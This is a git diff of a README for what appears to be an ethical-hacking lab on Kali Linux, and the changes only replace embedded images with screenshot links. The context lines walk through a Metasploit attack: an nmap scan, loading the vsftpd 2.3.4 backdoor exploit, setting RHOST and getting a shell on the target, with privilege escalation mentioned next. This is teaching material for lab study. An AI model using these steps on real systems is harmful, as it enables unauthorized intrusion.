@@ -33,54 +33,50 @@ The above command will import the target scanned result to metasploit database. 
 
 sudo systemctl start postgresql
 
-Screenshot2.png
+https://github.com/eigbejosh1234/attack-simulation-ethical-hacking-all-on-kali-Linux/blob/0c842b0c2bdc5102831a7bf12bc7717a3b837b8c/Screenshot2.png
 
 To initialize/create or check if its has been configured, run:
 
 sudo msfdb init
 
-<img width="960" height="124" alt="image" src="https://github.com/user-attachments/assets/35936fd6-8559-435b-a0da-4c052c5e3539" />
-
+https://github.com/eigbejosh1234/attack-simulation-ethical-hacking-all-on-kali-Linux/blob/0c842b0c2bdc5102831a7bf12bc7717a3b837b8c/Screenshot3.png
 
 **Relunch your metasploit** 
 Open a new terminal run the below command to relunch your metasploit console:
 
 msfconsole
 
-<img width="960" height="284" alt="image" src="https://github.com/user-attachments/assets/23d02eaa-31c4-49c5-af50-60cc010f6ca7" />
-
+https://github.com/eigbejosh1234/attack-simulation-ethical-hacking-all-on-kali-Linux/blob/0c842b0c2bdc5102831a7bf12bc7717a3b837b8c/Screenshot4.png
 
 Then run the command below to confirm your connection. You should see "connected to msf postgresql:
 
 db_status
 
-<img width="746" height="36" alt="image" src="https://github.com/user-attachments/assets/b10be165-fd83-4bd6-baba-1dbf5d64ce20" />
-
+https://github.com/eigbejosh1234/attack-simulation-ethical-hacking-all-on-kali-Linux/blob/0c842b0c2bdc5102831a7bf12bc7717a3b837b8c/Screenshot5.png
 
 Then rerun the below command to import the targeted scaned result to metasploit database:
 
 db_nmap -sV -p- 192.168.*.*
 
-<img width="960" height="350" alt="image" src="https://github.com/user-attachments/assets/6e390815-8e21-4c0c-8af3-83358898a802" />
+https://github.com/eigbejosh1234/attack-simulation-ethical-hacking-all-on-kali-Linux/blob/0c842b0c2bdc5102831a7bf12bc7717a3b837b8c/Screenshot6.png
 
 Note: We are using por21 ftp version vsftp as our backdoor to gain access to the targeted device/get a module. run:
 
 search vsftpd
 
-<img width="960" height="125" alt="image" src="https://github.com/user-attachments/assets/36945b12-824e-452d-bc60-2815984d6f4a" />
+https://github.com/eigbejosh1234/attack-simulation-ethical-hacking-all-on-kali-Linux/blob/0c842b0c2bdc5102831a7bf12bc7717a3b837b8c/Screenshot7.png
 
 From the option below on the screenshot, choose 1. run:
 
 info 1
 
-<img width="960" height="540" alt="image" src="https://github.com/user-attachments/assets/a3b52fe9-0839-4b6e-ab86-f85aeb8e036d" />
+https://github.com/eigbejosh1234/attack-simulation-ethical-hacking-all-on-kali-Linux/blob/0c842b0c2bdc5102831a7bf12bc7717a3b837b8c/Screenshot8.png
 
 run command:
 
 use exploit/unix/ftp/vsftpd_234_backdoor
 
-<img width="960" height="45" alt="image" src="https://github.com/user-attachments/assets/8c1c742f-baab-4d94-b5dd-cd9dc4e60cf7" />
-
+https://github.com/eigbejosh1234/attack-simulation-ethical-hacking-all-on-kali-Linux/blob/0c842b0c2bdc5102831a7bf12bc7717a3b837b8c/Screenshot9.png
 
 run:
 set RHOST 192.168.*.*
@@ -98,8 +94,7 @@ run:
 
 run
 
-<img width="960" height="322" alt="image" src="https://github.com/user-attachments/assets/ee2476e6-9931-44e4-8af9-5be36ba2ffab" />
-
+https://github.com/eigbejosh1234/attack-simulation-ethical-hacking-all-on-kali-Linux/blob/0c842b0c2bdc5102831a7bf12bc7717a3b837b8c/Screenshot10.png
 
 When you check the last output you will noticed that we have gotten a shell. That means you are in your target device. You now have access to go through your target directories and escalate previledges. 
 
